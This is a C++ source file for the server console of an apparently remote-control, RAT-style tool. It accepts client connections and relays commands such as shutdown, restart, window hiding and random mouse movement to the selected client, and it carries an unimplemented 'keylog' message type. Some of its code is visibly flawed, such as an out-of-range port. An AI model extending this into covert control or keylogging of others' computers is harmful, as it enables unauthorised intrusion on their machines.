//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>

//-- Other header modules.
#include "sEncryption.h"

//--Standard includes.
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <thread>
#include <fstream>

#define max_buffer 8192
#define Version MAKEWORD(2, 2)
	             
#undef max

	using namespace std;

enum sendcode
{
	none, text, file, keylog
};


const char* logo =
		"       **                   **                **                                \n"
		"      /**                  /**               /**                                \n"
		" *****/**      ******      /** ******  ***** /**      ******  **    **          \n"
		" **   //*****  **   /**  ********/  /****/ /* /*****  **   /*// ** **           \n"
		"//*****/**///** ******* **///*/**   /*/*** *** /**  /** ******* //***           \n"
		" /   /*/**  /****/  /**/**  /*/**   /*/**/  / /**  /** */  /**  **/**           \n"
		" ******/**  /*//*******//*****//******//***** /**  /*//******* ** // **         \n"
		" ////// //   // //////// ////// //////  ////// //   // /////// //   //    v.1.1 \n"
		"Type 'help' for quick docs.";

//--IMPORTANT GLOBALS
std::string ipv4ADDR = "127.0.0.0";
unsigned int socketPort = 69420;


typedef struct connectedClient 
{
	std::string name;
	std::string ipAddress;
	int incomingClientSocket;
	char isActive = 0;

	connectedClient(char* setName, char* setIp, int setClientSocket)
	{
		
		this->name = setName;
		this->ipAddress = setIp;
		this->incomingClientSocket = setClientSocket;
	};
	void _cdecl setIsActive(char isActiveBool) 
	{

		this->isActive = isActiveBool;
	};
};
std::vector<connectedClient> allConnectedClients;
unsigned int activeClient;


//-- Not a real threadpool since threads are still created and destroyed.
std::vector<std::thread> threads;



namespace localFunctions 
{

void __cdecl sendInfoToClient(unsigned int incomingClientSocket, char* byteBuffer, int size) 
{

		send(incomingClientSocket, byteBuffer, size, NULL);
		Sleep(5);
		return;
	};

void  __cdecl outputColor(int colorCode) 
{

		SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), colorCode);
	return;
	};
};

namespace multithread 
{

void __cdecl recvPackets(connectedClient newClient) 
{
		char byteBuffer[max_buffer];
		sEncryption::zeroBuffer(byteBuffer, max_buffer);
		std::string stringBuffer;
		while (1) 
		{
			int recievedBytes = recv(newClient.incomingClientSocket, byteBuffer, max_buffer, NULL);

		stringBuffer = std::string(byteBuffer, recievedBytes);
			if (recievedBytes == NULL || recievedBytes == SOCKET_ERROR) 
			{

			int i = 0;
				for (auto& cClient : allConnectedClients) 
				{
					if (cClient.incomingClientSocket == newClient.incomingClientSocket)
					{

				allConnectedClients.erase(allConnectedClients.begin() + i);

					localFunctions::outputColor(0xC);
					std::cout << newClient.ipAddress << " has disconnected, client: " << i << std::endl;
						localFunctions::outputColor(0x7);
						std::cout << ">>> ";
					};
					 i++;
				};
				break;
			}
			else 
			{
				   int currentVectorPos;
				for (unsigned int i = 0; i <= allConnectedClients.size() - 1; i++) 
				{
					if (allConnectedClients[i].ipAddress == newClient.ipAddress && allConnectedClients[i].incomingClientSocket == newClient.incomingClientSocket) 
					{

						currentVectorPos = i;
					};
				};
				if (allConnectedClients[currentVectorPos].isActive == 1) 
				{

							//--Do other things to the bytes. I can make it interpret stuff for file transfer etc.
					char c = stringBuffer.c_str()[0];
	
					stringBuffer = stringBuffer.substr(1);

					switch (c)
					{
					case text:

						std::cout << "\b\b\b\b " << stringBuffer << std::endl << ">>> ";
						break;
					case file:
							
						break;
					default:

						break;
					};
				};
			};
		};
};

void __cdecl listenForClients(int listeningServerSocket) 
{

		sockaddr_in socketAddress;
		socketAddress.sin_family = AF_INET;
		socketAddress.sin_port = htons(socketPort);
		inet_pton(AF_INET, ipv4ADDR.c_str(), &socketAddress.sin_addr);
		while (1) 
		{
			//-- Two colons to fix multithreading inclusion
			::bind(listeningServerSocket, (sockaddr*)&socketAddress, sizeof(socketAddress));
			listen(listeningServerSocket, SOMAXCONN);

			sockaddr_in clientSocketAddress;
			//-- Set size in memory.
			int clientSocketSize = sizeof(clientSocketAddress);
			
			unsigned int incomingClientSocket = accept(listeningServerSocket, (sockaddr*)&clientSocketAddress, &clientSocketSize);

			char computerName[max_buffer];
			char clientIp[max_buffer];
			char serverPort[max_buffer];

			sEncryption::zeroBuffer(computerName, max_buffer);
			sEncryption::zeroBuffer(clientIp, max_buffer);
			sEncryption::zeroBuffer(serverPort, max_buffer);

			char nameInformation = getnameinfo((sockaddr*)&clientSocketAddress, sizeof(clientSocketAddress), computerName, NI_MAXHOST, serverPort, NI_MAXSERV, NULL);
			inet_ntop(AF_INET, &clientSocketAddress.sin_addr, clientIp, NI_MAXHOST);

			if (nameInformation == 0) 
			{

				localFunctions::outputColor(0xA);
				std::cout << computerName << " has connected to port " << serverPort << ". IP: " << clientIp << std::endl;
				localFunctions::outputColor(0x7);
				std::cout << ">>> ";

				char sendBuffer[max_buffer] = "Successfully connected to the server!";
				localFunctions::sendInfoToClient(incomingClientSocket, sendBuffer, max_buffer);

			connectedClient newClient(computerName, clientIp, incomingClientSocket);

				allConnectedClients.push_back(newClient);

				threads.push_back(std::thread(multithread::recvPackets, newClient));
			}
			else 
			{
				localFunctions::outputColor(0xA);
				std::cout << computerName << " has connected to port " << ntohs(clientSocketAddress.sin_port) << ". IP: " << clientIp << std::endl;
				localFunctions::outputColor(0x7);
				std::cout << ">>> ";

				char sendBuffer[max_buffer] = "Successfully connected to the server!";

				localFunctions::sendInfoToClient(incomingClientSocket, sendBuffer, max_buffer);
			};
		//closesocket(listeningServerSocket); Dont close this, this socket needs to stay open.
		};
	};

};


int __cdecl main(void) 
{
	localFunctions::outputColor(0xA);
	std::cout << logo << "\n\nEnter the local ip and port of the server, use format localaddr:socket." << std::endl;

	localFunctions::outputColor(0x7);
	char inputBuffer[max_buffer];
std:cin.get(inputBuffer, max_buffer);
	std::string inputBuffer_str = inputBuffer;

		ipv4ADDR = inputBuffer_str.substr(0, inputBuffer_str.find(":"));
		std::stringstream newStream;
		newStream << inputBuffer_str.substr(inputBuffer_str.find(":") + 1);
		newStream >> socketPort;

	std::cin.ignore(std::numeric_limits <long long>::max(), '\n');
	std::cout << std::endl << std::endl;

	WSAData socketDataStructure;

	int socketStartup = WSAStartup(Version, &socketDataStructure);

	if (socketStartup != NULL)
	{
		localFunctions::outputColor(0xC);
		std::cout << "Unable to start up socket!" << std::endl;
		localFunctions::outputColor(0x7);

		return 1;
	};
	unsigned int listeningServerSocket = socket(AF_INET, SOCK_STREAM, NULL);
	if (listeningServerSocket == INVALID_SOCKET) 
	{
		localFunctions::outputColor(0xC);
		std::cout << "Creation of socket failed!" << std::endl;
		localFunctions::outputColor(0x7);

		return 1;
	};


	std::thread mainListenerThread = std::thread(multithread::listenForClients, listeningServerSocket);

//--Console Parser {
	while (1) 
	{
		std::cout << ">>> ";
		try 
		{
			char inByteBuffer[max_buffer];
			sEncryption::zeroBuffer(inByteBuffer, max_buffer);
				std::cin.get(inByteBuffer, max_buffer);

			std::string stringBuffer = inByteBuffer;
			std::stringstream stringStreamBuffer;


			if (stringBuffer.substr(0, 7) == "connect")
			{
				int clientNumber;

				std::string temporaryString = stringBuffer.substr(7);
				stringStreamBuffer << temporaryString;
				stringStreamBuffer >> clientNumber;
				activeClient = clientNumber;

				for (auto& cClient : allConnectedClients)
				{

					cClient.setIsActive(0);
				};
				allConnectedClients.at(clientNumber).setIsActive(1);

				localFunctions::outputColor(0xA);
				std::cout << "Successfully connected to client " << clientNumber << "." << std::endl;
				localFunctions::outputColor(0x7);
			}
			else if (stringBuffer.substr(0, 4) == "list")
			{
				int i = 0;
				for (auto& cClient : allConnectedClients)
				{

					if (cClient.isActive == 1)
					{
						std::cout << "|" << cClient.name << ", ip: " << cClient.ipAddress << ", client: " << i << "| <-connected" << std::endl << std::endl;
					}
					else
					{
						std::cout << "|" << cClient.name << ", ip: " << cClient.ipAddress << ", client: " << i << "|" << std::endl << std::endl;
					};
					i++;
				};
				if (i == 0)
				{
					localFunctions::outputColor(0xC);
					std::cout << "No clients are connected." << std::endl;
					localFunctions::outputColor(0x7);
				};
			}
			else if (stringBuffer.substr(0, 7) == "sendcmd")
			{

				unsigned int clientHandle = allConnectedClients[activeClient].incomingClientSocket;

				char sendInfo[max_buffer];
				sEncryption::zeroBuffer(sendInfo, max_buffer);
				memcpy(sendInfo, stringBuffer.substr(8).c_str(), strlen(stringBuffer.substr(8).c_str()));

				int infoSize = strlen(sendInfo);


				localFunctions::sendInfoToClient(clientHandle, sendInfo, infoSize + 1);

			}
			else if (stringBuffer.substr(0, 5) == "clear")
			{
				std::system("CLS");

				localFunctions::outputColor(0xA);
				std::cout << logo << std::endl << std::endl;

				localFunctions::outputColor(0x7);
			}
			else if (stringBuffer.substr(0, 4) == "help")
			{
				
				std::cout << 
					"\n\n terminal commands:\n"
					"  -connect; sets an active client via its given id. I.E. connect 0 - connects to the first client, 1 is the second, and so on. (An active client is the client that can recieve data and send it back to the server.)\n"
					"  -list; lists any clients that are currently connected to the server.\n"
					"  -sendcmd; sends any [client executed commands] to the client to process.\n"
					"  -clear; clears the terminal. \n\n"
					"\nclient executed commands:\n"
					"  -close_client; disconnects the client.\n"
					"  -shutdown/restart; shuts down or restarts the client pc depending on which command is used.\n"
					"  -get_window; gets the active focused window the client pc has opened.\n"
					"  -hide_window; closes the current active window that is focused on the client pc.\n"
					"  -random_mouse; sets the current cursor position to random.\n"
					<< endl;
			};

			std::cin.ignore(std::numeric_limits<long long>::max(), '\n');
		}
		catch (std::exception& e) 
		{
			localFunctions::outputColor(0xC);
			std::cout << "Error with the command." << std::endl;
			localFunctions::outputColor(0x7);

			std::cin.ignore(std::numeric_limits<long long>::max(), '\n');
		};
	};
//-- };

	std::cin.get();

	return 0;
};